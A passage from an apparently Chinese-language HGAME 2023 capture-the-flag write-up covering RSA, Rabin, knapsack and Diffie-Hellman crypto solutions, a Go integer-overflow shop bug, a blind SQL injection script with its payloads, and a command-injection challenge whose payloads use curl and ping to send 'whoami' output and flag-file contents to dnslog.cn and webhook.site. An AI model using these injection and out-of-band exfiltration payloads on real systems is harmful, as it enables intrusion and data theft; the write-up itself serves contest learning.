class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python">p =<span class="hljs-number">65428327184555679690730137432886407240184329534772421373193521144693375074983</span><br>q =<span class="hljs-number">98570810268705084987524975482323456006480531917292601799256241458681800554123</span><br>c =<span class="hljs-number">0x4e072f435cbffbd3520a283b3944ac988b98fb19e723d1bd02ad7e58d9f01b26d622edea5ee538b2f603d5bf785b0427de27ad5c76c656dbd9435d3a4a7cf556</span><br>e = <span class="hljs-number">2</span><br>R.&lt;x&gt; = Zmod(p)[] <span class="hljs-comment">#将x作为需要求得的未知数，p为素数</span><br>f = x^e-c<br>r1 = [<span class="hljs-built_in">int</span>(i[<span class="hljs-number">0</span>]) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> f.roots()] <span class="hljs-comment">#f.roots()返回求解出来的所有解的列表</span><br>R.&lt;x&gt; = Zmod(q)[]<br>f = x^e-c<br>r2 = [<span class="hljs-built_in">int</span>(i[<span class="hljs-number">0</span>]) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> f.roots()]<br>m = []<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> r1:<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> r2:<br>        m.append(crt([i,j],[p,q])) <span class="hljs-comment">#crt求解中国剩余定理，第一个参数为余数列表，第二个参数为模数列表</span><br><span class="hljs-built_in">print</span>(m) <span class="hljs-comment">#将所有可能的m输出，复制到python里long_to_bytes()</span><br><br></code></pre></td></tr></table></figure><p>到Python中</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br>flag=[<span class="hljs-number">2372237455851842898349117425227584430588749791480564189568122389688124352290664541063989455711371754963358673223097609351443007448201859216160320647129068</span>, <span class="hljs-number">202822073494981439416400155064048668390596366869305553433016288033759387909443994349181</span>, <span class="hljs-number">6449323225107597053933443750923454260964062647115639999185223478236408615216462580775151285384372189740266233875418656692511620093103204244355042080455728</span>, <span class="hljs-number">4077085769255754155584326325695869830375312855635075809617101088548487084999293021150578229828064483445298157019190352894501628932935104416104165427675841</span>]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> flag:<br>    <span class="hljs-built_in">print</span>(long_to_bytes(i))<br></code></pre></td></tr></table></figure><p><code>hgame&#123;That'5_s0_3asy_to_s@lve_r@bin&#125;</code></p><h3 id="rsa-大冒险1"><a class="markdownIt-Anchor" href="#rsa-大冒险1"></a> RSA 大冒险1</h3><p>4关挑战，通过拿flag</p><p>直接上解题代码</p><p>challenge 1</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> libnum<br>c=<span class="hljs-number">0x56908e6a818ea207ac312c0b204d94ee651cd7b26313fbfdcfb2406828ad379fa12529cf3db2a4d903</span><br>n=<span class="hljs-number">209770295744242916299788862153266483138979976716588739416239543100484342323180172904935777216735461</span><br>p=<span class="hljs-number">333053352923682535111489833655011123013</span><br>e = <span class="hljs-number">65537</span><br><br>d = libnum.invmod(e, (p-<span class="hljs-number">1</span>))<br>m = <span class="hljs-built_in">pow</span>(c, d, p)<br><span class="hljs-built_in">print</span>(libnum.n2s(m))<br><br><span class="hljs-comment">#m&lt;n_But_also_m&lt;p</span><br></code></pre></td></tr></table></figure><p>challenge 2</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> libnum<br><span class="hljs-keyword">import</span> math<br><br>c1 = <span class="hljs-number">0xa757143e3ea0753ac3c15e0dd05bc6eb58bdf947203c321417fb2739a9072ee5969b7ae017bb68c46969ceddccb0b3e8e27f0b79ba011065e9e0c0d6ec04c7735bc7d2d3d55119f3852c78264c40c9b36fffbc8741515d6d43f4aeba50186ceb45952617d8f4d15e0c0e84397d58aad6b9d8df15adc1f29c4c37addfb6f901d</span><br>c2 = <span class="hljs-number">0xca21ea2228e901614120f89036e62c36f385343c9b15a43c47d23097bb6eb6df4cc6aac315f283b35bf3e00612fea7ee2711248615c10b61475e96f57a94ecfb49b1b60495353c6232510e995251c6a3744193f0e3c10bc1cb9f8bbab19b7cd2a67fab178ca7fe6263aa22c460b0b51af14c9dc2adbe6aa9539e05b214dc1bf</span><br>n1 = <span class="hljs-number">99117167225742621252747360705927288427226074291111147359767727530232979959246961303002594953502494314944737381744946594792258965951764387793904602632138990093085873703735789929744541078195532792040220263365256453293757661668916687151993893223835585293806890903078811527485480385874789904018025085480072921947</span><br>n2 = <span class="hljs-number">90708232882117493164546448126493812176926972474525609918179199222944319390160880291246879414964890005116911514705462257621255399480873008530781044973928567730151038933999620333681189161328502592514982955942546631546678204758589280772127887941509353870320299744541746637191024740549289281821158392283041483783</span><br>p = math.gcd(n1, n2)<br>e = <span class="hljs-number">65537</span><br>d = libnum.invmod(e, (p - <span class="hljs-number">1</span>))<br>m = <span class="hljs-built_in">pow</span>(c1, d, p)<br><span class="hljs-built_in">print</span>(libnum.n2s(m))<br><span class="hljs-comment">#make_all_modulus_independent</span><br></code></pre></td></tr></table></figure><p>challenge 3</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> gmpy2<br>n = <span class="hljs-number">114515838473805006712847594704380677940280499969617865451903741803970304896753055873744402239365107537263730326351655179037631201887020732179784578687179230556396662015803684388855028443206818232761239630564571111262306517782298740762072717669765284942698987218518593869320732633953301487410854175666320988421</span><br>e = <span class="hljs-number">3</span><br>c = <span class="hljs-number">0xfec61958cefda3eb5f709faa0282bffaded0a323fe1ef370e05ed3744a2e53b55bdd43e9594427c35514505f26e4691ba86c6dcff6d29d69110b15b9f84b0d8eb9ea7c03aaf24fa957314b89febf46a615f81ec031b12fe725f91af9d269873a69748</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">200000000</span>):<br>    <span class="hljs-keyword">if</span> gmpy2.iroot(c + n * i, <span class="hljs-number">3</span>)[<span class="hljs-number">1</span>] == <span class="hljs-number">1</span>:<br>        res = gmpy2.iroot(c + n * i, <span class="hljs-number">3</span>)[<span class="hljs-number">0</span>]<br>        <span class="hljs-built_in">print</span>(i, res)<br>        <span class="hljs-built_in">print</span>(libnum.n2s(<span class="hljs-built_in">int</span>(res)))<br>        <span class="hljs-keyword">break</span><br>   <br><span class="hljs-comment">#encrypt_exponent_should_be_bigger</span><br></code></pre></td></tr></table></figure><p>challenge 4</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#共模攻击</span><br><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> libnum<br><br>n = <span class="hljs-number">82359994555957061700863027886322811457676109608256083872064055426219259168794095530809575147825700925031273940545355557102788577532782300265260138429958167909187144110770618006792214374768047428973415244582649583493180328548963991180770977787901825467721537824736537797481709634514539903832239828285924506839</span><br>e1 = <span class="hljs-number">108289</span><br>e2 = <span class="hljs-number">81013</span><br>s = gcdext(e1, e2)<br>s1 = s[<span class="hljs-number">1</span>]<br>s2 = -s[<span class="hljs-number">2</span>]<br><br>c1 = <span class="hljs-number">0x64d0825cadb4374aec113fcac2d752bb71d4586a9bb02b6d82f76fda0b642af037447b9cf76f80b1f4066bcf94dd6538b253a02aaa8f956edbd20c2a2f311b1f554ff7f968f124a8472d6d5306d9c96e16b737ee5675061e4de58bc6b5fb7f3cc5f92647c6aba9010b03b2c5d4d28b031d77205bc238b19785783e80e3a9146d</span><br>c2 = <span class="hljs-number">0x1eed249f0b99aa87992b59387ec11a0b36022aa475c3917d6a85c36745c5d0e7275c16e9879e2192491783533941b50cd97a0f4f32803df7118288c89f4e22555ca98d0417063dbb81c60e2d1a2e696bcec16660cd396aaf9b5743c1944b28adb33f73f70f3aa5fed5cd2cef0c9920dd54e68b34f40fe31e3662f1d9d484fff3</span><br><span class="hljs-comment"># e2=9647291</span><br>c2 = invert(c2, n)<br>m = (<span class="hljs-built_in">pow</span>(c1, s1, n) * <span class="hljs-built_in">pow</span>(c2, s2, n)) % n<br><span class="hljs-built_in">print</span>(m)<br><span class="hljs-built_in">print</span>(libnum.n2s(<span class="hljs-built_in">int</span>(m)))<br><span class="hljs-comment">#never_uese_same_modulus</span><br></code></pre></td></tr></table></figure><p><code>hgame&#123;W0w_you^knowT^e_CoMm0n_&amp;t$ack_@bout|RSA&#125;</code></p><h3 id="包里有什么"><a class="markdownIt-Anchor" href="#包里有什么"></a> 包里有什么</h3><p>看了官方wp，发现想多了，不需要求长度和w</p><p>根据扩展的欧几里得算法直接可以求出w的逆元</p><img src="/2023/01/05/HGAME/17.png" class=""><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> long_to_bytes<br><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> gcdext<br>m = <span class="hljs-number">1528637222531038332958694965114330415773896571891017629493424</span><br>b0 = <span class="hljs-number">69356606533325456520968776034730214585110536932989313137926</span><br>c = <span class="hljs-number">93602062133487361151420753057739397161734651609786598765462162</span><br>winv = gcdext(b0, m)[<span class="hljs-number">1</span>]<br>v = c * winv % m &gt;&gt; <span class="hljs-number">1</span>    <span class="hljs-comment">#乘上w的逆元再除以2</span><br>flag = <span class="hljs-string">&#x27;hgame&#123;&#x27;</span> + long_to_bytes(<span class="hljs-built_in">int</span>(<span class="hljs-built_in">bin</span>(v)[<span class="hljs-number">2</span>:][::-<span class="hljs-number">1</span>], <span class="hljs-number">2</span>)).decode() + <span class="hljs-string">&#x27;&#125;&#x27;</span><br><span class="hljs-built_in">print</span>(flag)<br><span class="hljs-comment">#hgame&#123;1t&#x27;s_4n_3asy_ba9_isn7_it?&#125;</span><br></code></pre></td></tr></table></figure><h3 id="sign-in-pro-max"><a class="markdownIt-Anchor" href="#sign-in-pro-max"></a> Sign In Pro Max</h3><p>附件如下</p><figure class="highlight vhdl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs vhdl">Part1, <span class="hljs-keyword">is</span> seems like baseXX: QVl5Y3BNQjE1ektibnU3SnN6M0tGaQ==<br>Part2, a hash <span class="hljs-keyword">function</span> <span class="hljs-keyword">with</span> <span class="hljs-number">128</span><span class="hljs-built_in">bit</span> digest size <span class="hljs-keyword">and</span> <span class="hljs-number">512</span><span class="hljs-built_in">bit</span> <span class="hljs-keyword">block</span> size: c629d83ff9804fb62202e90b0945a323<br>Part3, a hash <span class="hljs-keyword">function</span> <span class="hljs-keyword">with</span> <span class="hljs-number">160</span><span class="hljs-built_in">bit</span> digest size <span class="hljs-keyword">and</span> <span class="hljs-number">512</span><span class="hljs-built_in">bit</span> <span class="hljs-keyword">block</span> size: <span class="hljs-number">99</span>f3b3ada2b4675c518ff23cbd9539da05e2f1f8<br>Part4, the <span class="hljs-keyword">next</span> generation hash <span class="hljs-keyword">function</span> <span class="hljs-keyword">of</span> part3 <span class="hljs-keyword">with</span> <span class="hljs-number">256</span><span class="hljs-built_in">bit</span> <span class="hljs-keyword">block</span> size <span class="hljs-keyword">and</span> <span class="hljs-number">64</span> rounds: <span class="hljs-number">1838</span>f8d5b547c012404e53a9d8c76c56399507a2b017058ec7f27428fda5e7db<br>Ufwy5 nx <span class="hljs-number">0</span>gh0jf61i21h, stb uzy fqq ymj ufwyx ytljymjw, its<span class="hljs-symbol">&#x27;y</span> ktwljy ymj ktwrfy.<br></code></pre></td></tr></table></figure><figure class="highlight vhdl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs vhdl">Part1是base加密：base32+base58+base64f51d3a18<br>Part2,a hash <span class="hljs-keyword">function</span> <span class="hljs-keyword">with</span> <span class="hljs-number">128</span><span class="hljs-built_in">bit</span> digest size <span class="hljs-keyword">and</span> <span class="hljs-number">512</span><span class="hljs-built_in">bit</span> <span class="hljs-keyword">block</span> size 是md5f91c<br>Part3,a hash <span class="hljs-keyword">function</span> <span class="hljs-keyword">with</span> <span class="hljs-number">160</span><span class="hljs-built_in">bit</span> digest size <span class="hljs-keyword">and</span> <span class="hljs-number">512</span><span class="hljs-built_in">bit</span> <span class="hljs-keyword">block</span> size 是sha-<span class="hljs-number">1</span><span class="hljs-number">4952</span><br>Part4,the <span class="hljs-keyword">next</span> generation hash <span class="hljs-keyword">function</span> <span class="hljs-keyword">of</span> part3是sha-<span class="hljs-number">2</span>，<span class="hljs-number">256</span><span class="hljs-built_in">bit</span> <span class="hljs-keyword">block</span> size <span class="hljs-keyword">and</span> <span class="hljs-number">64</span> rounds是sha-<span class="hljs-number">256</span>a3ed<br>最后一句是凯撒加密，位移<span class="hljs-number">5</span>，Part5 <span class="hljs-keyword">is</span> <span class="hljs-number">0</span>bc0ea61d21c, now put <span class="hljs-keyword">all</span> the parts together, don<span class="hljs-symbol">&#x27;t</span> forget the format<br></code></pre></td></tr></table></figure><p>以为flag就是hgame{f51d3a18f91c4952a3ed0bc0ea61d21c}</p><p>结果交上去是错的，发现part5后面还有一句don’t forget format,尝试每部分之间加<code>_</code>,发现还是错误，换成<code>-</code>就对了</p><p><code>hgame&#123;f51d3a18-f91c-4952-a3ed-0bc0ea61d21c&#125;</code></p><h2 id="week-3"><a class="markdownIt-Anchor" href="#week-3"></a> Week 3</h2><h3 id="login-to-get-my-gift"><a class="markdownIt-Anchor" href="#login-to-get-my-gift"></a> Login To Get My Gift</h3><p>测试一下，只显示<code>Success</code>,<code>Fail</code>,<code>SQL Injection Detected</code>,应该是盲注</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&#x27;http://week-3.hgame.lwsec.cn:31480/login&#x27;</span><br>cookie = &#123;<span class="hljs-string">&#x27;_ga_P1E9Z5LRRK&#x27;</span>: <span class="hljs-string">&#x27;GS1.1.1673534407.1.1.1673534578.0.0.0&#x27;</span>, <span class="hljs-string">&#x27;_ga&#x27;</span>: <span class="hljs-string">&#x27;GA1.1.690589002.1673534407&#x27;</span>&#125;<br>flag=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">30</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>,<span class="hljs-number">128</span>):<br>        payload = <span class="hljs-string">&quot;0&#x27;/**/or/**/ascii(right(left((select/**/concat_ws(0x7e,PAssw0rD)/**/from/**/User1nf0mAt1on/**/limit/**/0,1),&#123;0&#125;),1))/**/regexp/**/&#123;1&#125;#&quot;</span>.<span class="hljs-built_in">format</span>(i+<span class="hljs-number">1</span>,j)<br>        <span class="hljs-built_in">print</span>(payload)<br>        data = &#123;<span class="hljs-string">&#x27;username&#x27;</span>: payload, <span class="hljs-string">&#x27;password&#x27;</span>: <span class="hljs-number">1</span>&#125;<br>        rsp = requests.post(url=url, data=data, cookies=cookie)<br>        <span class="hljs-comment">#print(rsp.text)</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;Success!&#x27;</span> <span class="hljs-keyword">in</span> rsp.text:<br>            flag+=<span class="hljs-built_in">chr</span>(j)<br>            <span class="hljs-built_in">print</span>(flag)<br>            <span class="hljs-keyword">break</span><br><br></code></pre></td></tr></table></figure><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs mysql">0&#x27;/**/or/**/length((database()))&lt;8/**/#数据库长度7<br>0&#x27;/**/or/**/ascii(right(left(database(),&#123;0&#125;),1))/**/regexp/**/&#123;1&#125;/**/#.format(i,j)数据库名L0g1NMe<br>0&#x27;/**/or/**/length(((select/**/concat_ws(0x7e,table_name)/**/from/**/information_schema.tables/**/where/**/table_schema/**/regexp/**/database()/**/limit/**/0,1)))&gt;1/**/#只有一个表<br>0&#x27;/**/or/**/length(((select/**/concat_ws(0x7e,table_name)/**/from/**/information_schema.tables/**/where/**/table_schema/**/regexp/**/database()/**/limit/**/0,1)))&lt;15/**/#表名长度为14<br>0&#x27;/**/or/**/ascii(right(left((select/**/concat_ws(0x7e,table_name)/**/from/**/information_schema.tables/**/where/**/table_schema/**/regexp/**/database()/**/limit/**/0,1),&#123;0&#125;),1))/**/regexp/**/&#123;1&#125;#&quot;.format(i+1,j)表名User1nf0mAt1on<br>0&#x27;/**/or/**/length(((select/**/concat_ws(0x7e,column_name)/**/from/**/information_schema.columns/**/where/**/table_name/**/regexp/**/&#x27;User1nf0mAt1on&#x27;/**/limit/**/2,1)))&gt;1/**/#列数 3列<br><br>0&#x27;/**/or/**/ascii(right(left((select/**/concat_ws(0x7e,column_name)/**/from/**/information_schema.columns/**/where/**/table_name/**/regexp/**/&#x27;User1nf0mAt1on&#x27;/**/limit/**/0,1),1),1))/**/&gt;/**/100#<br>第一列长度2 id 第二列长度8 PAssw0rD第三列长度8UsErN4me<br><br>0&#x27;/**/or/**/ascii(right(left((select/**/concat_ws(0x7e,UsErN4me)/**/from/**/User1nf0mAt1on/**/limit/**/0,1),&#123;0&#125;),1))/**/regexp/**/&#123;1&#125;#&quot;.format(i+1,j)<br>1WeLc0meT0hgAmE2023hAPPySqlhgAmE2023HAppYnEwyEAr<br></code></pre></td></tr></table></figure><p>拿到管理员的用户名和密码，访问/home得到flag</p><p><code>hgame&#123;It_1s_1n7EresT1nG_T0_ExPL0Re_Var10us_Ways_To_Sql1njEct1on&#125;</code></p><h3 id="ping-to-the-host"><a class="markdownIt-Anchor" href="#ping-to-the-host"></a> Ping To The Host</h3><p>一看RCE,马上试一下127.0.0.1|ls ，结果无回显。。。。</p><p>试了几个无回显RCE，发现DNS带外和http带外可以用，不过还是有点小坑</p><p>payload1:DNS带外</p><p>在<a href="http://www.dnslog.cn/">DNSLog</a>注册一个临时的DNS</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">127</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">1</span>|ping$IFS$<span class="hljs-number">9</span>`whoami`.<span class="hljs-number">7</span>n17xh.dnslog.cn<br><span class="hljs-attribute">127</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">1</span>|ping$IFS$<span class="hljs-number">9</span>`head$IFS$<span class="hljs-number">9</span>/f*`.<span class="hljs-number">7</span>n17xh.dnslog.cn<br></code></pre></td></tr></table></figure><img src="/2023/01/05/HGAME/18.png" class=""><p>payload2:http带外</p><p>在<a href="https://webhook.site/">webhook</a>生成一个临时网站来接受请求查看回显</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">127</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">1</span>|curl$IFS$<span class="hljs-number">9</span>https://webhook.site/<span class="hljs-number">318355</span>c4-be7a-<span class="hljs-number">4</span>a93-<span class="hljs-number">8241</span>-<span class="hljs-number">53</span>a6028f7070/`whoami`<br><span class="hljs-attribute">127</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">1</span>|curl$IFS$<span class="hljs-number">9</span>https://webhook.site/<span class="hljs-number">318355</span>c4-be7a-<span class="hljs-number">4</span>a93-<span class="hljs-number">8241</span>-<span class="hljs-number">53</span>a6028f7070/`head$IFS$<span class="hljs-number">9</span>/f*`<br></code></pre></td></tr></table></figure><img src="/2023/01/05/HGAME/19.png" class=""><h3 id="gopher-shop"><a class="markdownIt-Anchor" href="#gopher-shop"></a> Gopher Shop</h3><p>这道是没有做出来的题，看了wp，学习一下</p><p>随便注册一个账户进去商店</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">//校验是否买的起</span><br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> || number &lt; <span class="hljs-number">1</span> || user.Balance &lt; <span class="hljs-type">uint</span>(number) * price&#123;<br>context.JSON(<span class="hljs-number">400</span>, gin.H&#123;<span class="hljs-string">&quot;error&quot;</span>: <span class="hljs-string">&quot;invalid request&quot;</span>&#125;)<br><span class="hljs-keyword">return</span><br>&#125;<br></code></pre></td></tr></table></figure><p>这里是golang整数溢出漏洞，uint类型在64位机器上运⾏时为uint64，最⼤值为 18446744073709551615 ,最⼩值为 0 ，超出范围都会溢出。</p><p>要使<code>uint(number) * price</code>小于等于给定的10元，这样就可以买到超多的Apple,再把Apple买出去就可以用来买flag</p><p><code>1844674407370955162*10=18446744073709551620=4&lt;10</code>,因此可以购买1844674407370955162个Apple</p><img src="/2023/01/05/HGAME/20.png" class=""><p>慢慢地把Apple卖出去（数值不能溢出）</p><img src="/2023/01/05/HGAME/21.png" class=""><p>再Check Flag一下，<code>hgame&#123;GopherShop_M@gic_1nt_0verflow&#125;</code></p><h3 id="ezdh"><a class="markdownIt-Anchor" href="#ezdh"></a> ezDH</h3><p>这个密码题不知道可以用sage⾥的discrete_log函数来解离散对数问题</p><p>discrete_log 就是结合Pohlig-Hellman algorithm和⼤步⼩步法 (bsgs)</p><p>可以对数分离就变得简单了</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> sage <span class="hljs-keyword">import</span> *<br>N = <span class="hljs-number">0x2be227c3c0e997310bc6dad4ccfeec793dca4359aef966217a88a27da31ffbcd6bb271780d8ba89e3cf202904efde03c59fef3e362b12e5af5afe8431cde31888211d72cc1a00f7c92cb6adb17ca909c3b84fcad66ac3be724fbcbe13d83bbd3ad50c41a79fcdf04c251be61c0749ea497e65e408dac4bbcb3148db4ad9ca0aa4ee032f2a4d6e6482093aa7133e5b1800001</span><br>g = GF(N)(<span class="hljs-number">2</span>)<br>A = <span class="hljs-number">0x22888b5ac1e2f490c55d0891f39aab63f74ea689aa3da3e8fd32c1cd774f7ca79538833e9348aebfc8eba16e850bbb94c35641c2e7e7e8cb76032ad068a83742dbc0a1ad3f3bef19f8ae6553f39d8771d43e5f2fcb986bd72459456d073e70d5be4d79ce5f10f76edea01492f11b807ebff0faf6819d62a8e972084e1ed5dd6e0152df2b0477a42246bbaa04389abf639833</span><br>B = <span class="hljs-number">0x1889c9c65147470fdb3ad3cf305dc3461d1553ee2ce645586cf018624fc7d8e566e04d416e684c0c379d5819734fd4a09d80add1b3310d76f42fcb1e2f5aac6bcdd285589b3c2620342deffb73464209130adbd3a444b253fc648b40f0acec7493adcb3be3ee3d71a00a2b121c65b06769aada82cd1432a6270e84f7350cd61dddc17fe14de54ab436f41b9c9a0430510dde</span><br>a=discrete_log(A,g)<br>b=discrete_log(B,g)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Alice secret:&#x27;</span>,a)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Bod secret:&#x27;</span>,b)<br><span class="hljs-keyword">assert</span> <span class="hljs-built_in">pow</span>(B,a,N)==<span class="hljs-built_in">pow</span>(A,b,N)<br>shared_secret=power_mod(B,a,N)<br>p=<span class="hljs-number">6864797660130609714981900799081393217269435300143305409394463459185543183397656052122559640661454554977296311391480858037121987999716643812574028291115057151</span><br>a=-<span class="hljs-number">3</span><br>b=<span class="hljs-number">1093849038073734274511112390766805569936207598951683748994586394495953116150735016013708737573759623248592132296706313309438452531591012912142327488478985984</span><br>E = EllipticCurve(GF(p), [a, b])<br><br>G=(<span class="hljs-number">6205877918333770287323403670543661734129170085954198767820861962261174202646976379181735257759867760655835711845144326470613882395445975482219869828210975915</span>, <span class="hljs-number">3475351956909044812130266914587199895248867449669290021764126870271692995160201860564302206748373950979891071705183465400186006709376501382325624851012261206</span>)<br>G=E(G)<br>Pa=(<span class="hljs-number">2131916734759224323822132103713450942372127857975491448998753734796387810139407713081623540463771547844600806401723562334185214530516095152824413924854874698</span>, <span class="hljs-number">1690322613136671350646569297044951327454506934124656653046321341087958059722809120500999091493097880695888777563486212179798037350151439310538948719271467773</span>) <br>Pa=E(Pa)<br>P1=(<span class="hljs-number">2032638959575737798553734238953177065671021112450002471824225734491735604600003028491729131445734432442510201955977472408728415227018746467250107080483073647</span>, <span class="hljs-number">3510147080793750133751646930018687527128938175786714269902604502700248948154299853980250781583789623838631244520649113071664767897964611902120411142027848868</span>)<br>P1=E(P1)<br>c=(<span class="hljs-number">6670373437344180404127983821482178149374116817544688094986412631575854021385459676854475335068369698875988135009698187255523501841013430892133371577987480522</span>, <span class="hljs-number">6648964426034677304189862902917458328845484047818707598329079806732346274848955747700716101983207165347315916182076928764076602008846695049181874187707051395</span>)<br>c=E(c)<br>m=c-shared_secret*P1<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">int</span>(m.xy()[<span class="hljs-number">0</span>]))<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br>m=<span class="hljs-number">13292147408567104965230968399931206813163211945388416847625302108610603758415964822638521981</span><br><span class="hljs-built_in">print</span>(long_to_bytes(m))<br><br><span class="hljs-comment">#hgame&#123;Weak_p@ramet3r_make_DHKE_broken&#125;</span><br></code></pre></td></tr></table></figure><h3 id="tunnel"><a class="markdownIt-Anchor" href="#tunnel"></a> Tunnel</h3><p>用wireshark打开，搜索hagme就拿到flag<code>hgame&#123;ikev1_may_not_safe_aw987rtgh&#125;</code></p>]]></content>
    
    
    <categories>
      
      <category>WP</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SSRF</title>
    <link href="/2023/01/04/SSRF/"/>
    <url>/2023/01/04/SSRF/</url>
    
